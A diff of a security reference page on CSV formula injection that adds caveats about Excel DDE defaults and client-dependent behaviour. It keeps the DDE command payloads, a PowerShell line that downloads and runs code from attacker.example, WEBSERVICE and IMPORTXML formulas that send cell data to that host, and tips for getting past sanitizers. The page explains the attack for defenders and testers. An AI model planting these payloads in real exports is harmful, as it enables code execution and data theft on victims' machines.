@@ -1,6 +1,6 @@
 ---
 title: "CSV formula injection"
-description: "Exported cells beginning with =, +, -, or @ are evaluated as formulas by spreadsheet software, enabling command execution via DDE and data exfiltration via web functions."
+description: "Exported cells beginning with formula trigger characters may be interpreted by spreadsheet software, with impact depending on the client, platform, trust settings, and external-content controls."
 keywords:
   - csv injection
   - formula injection
@@ -12,7 +12,7 @@ keywords:
 
 # CSV
 
-Spreadsheet software evaluates a cell as a formula when its text begins with certain characters. If an application exports attacker-controlled data to CSV (or TSV, SYLK, XLS) without neutralizing those cells, opening the file in Excel, LibreOffice Calc, or Google Sheets executes the attacker's formula on the victim's machine.
+Spreadsheet software may interpret a cell as a formula when its text begins with certain characters. If an application exports attacker-controlled data to CSV or another spreadsheet format without neutralizing those cells, opening or importing the file can evaluate the formula. The resulting impact depends on the spreadsheet client, operating system, protected-view state, external-content policy, and whether the user approves a warning.
 
 ## Trigger characters
 
@@ -26,19 +26,21 @@ Tab (`0x09`) and carriage return (`0x0D`) also lead into formula parsing in some
 
 ## Command execution via DDE
 
-Excel's legacy Dynamic Data Exchange lets a formula launch an external program. The classic proof fires the calculator:
+Excel's legacy Dynamic Data Exchange (DDE) can pass formula input to another program. The classic proof requests the command interpreter as a DDE server:
 
 ```
 =cmd|'/c calc'!A1
 ```
 
-Swap the command for something with impact, for example pulling and running a payload:
+On legacy or deliberately weakened installations where Excel may launch a DDE server, the command can request further actions:
 
 ```
 =cmd|'/c powershell -w hidden -c "iwr http://attacker.example/a|iex"'!A1
 ```
 
-The victim is prompted to enable DDE/content, but social engineering and "trusted" internal reports often get that click. A cell is parsed as a formula only when its **first byte** is a trigger, so where a sanitizer strips or escapes only a leading `=` but overlooks the other triggers, lead with one of those instead. `+`, `-`, `@`, a tab (`0x09`), and a carriage return (`0x0D`) all start formula parsing:
+Supported Excel versions disable DDE server launch by default. The payload above does not start `cmd.exe` unless policy or the user's Trust Center configuration permits server launch; other protected-view and content warnings may also intervene. DDE server lookup for an already running program is a separate setting. Treat command execution as a client-and-policy-specific outcome, not an automatic consequence of opening a CSV.
+
+A cell is parsed as a formula only when its **first byte** is a trigger, so where a sanitizer strips or escapes only a leading `=` but overlooks the other triggers, lead with one of those instead. `+`, `-`, `@`, a tab (`0x09`), and a carriage return (`0x0D`) can lead into formula parsing, depending on the client:
 
 ```
 @cmd|'/c calc'!A1
@@ -47,16 +49,16 @@ The victim is prompted to enable DDE/content, but social engineering and "truste
 
 A leading tab or CR before `=` works the same way: the whitespace is consumed and `=cmd|'/c calc'!A1` still parses. Prefixing a second trigger after the one being removed does not help, since once the first byte is stripped the survivor starts with text.
 
-## Data exfiltration without a click
+## Data-fetch formulas
 
-Some functions evaluate on open without the DDE prompt, leaking cell data to an attacker server. `WEBSERVICE` fetches a URL and can carry adjacent data in the query string:
+Some functions can request a URL and place cell data in its query string. Excel's `WEBSERVICE` is available on Windows but does not return results on Excel for Mac. Whether the request occurs automatically depends on protected view, external-content settings, trust state, and organizational policy:
 
 ```
 =WEBSERVICE("http://attacker.example/x?v="&A1)
 =WEBSERVICE(CONCATENATE("http://attacker.example/?",A1))
 ```
 
-Google Sheets offers equivalents that pull remote content and exfiltrate on load:
+Google Sheets offers functions that retrieve remote content, but import authorization, recalculation behavior, and service-side restrictions can prevent an automatic request. Verify the exact client behavior rather than assuming that viewing the sheet is sufficient:
 
 ```
 =IMPORTXML("http://attacker.example/?d="&A2,"//a")
@@ -93,4 +95,6 @@ Real `.xls` and `.xlsx` exports carry formulas natively, so any attacker string 
 ## References
 
 - [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
+- [Microsoft: manage DDE and OLE activation security settings](https://support.microsoft.com/en-us/excel/microsoft-excel-security-enhancements-in-the-january-2022-update-kb5010321)
+- [Microsoft: WEBSERVICE function](https://support.microsoft.com/en-us/excel/functions/webservice-function)
 - [PayloadsAllTheThings: CSV Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection)
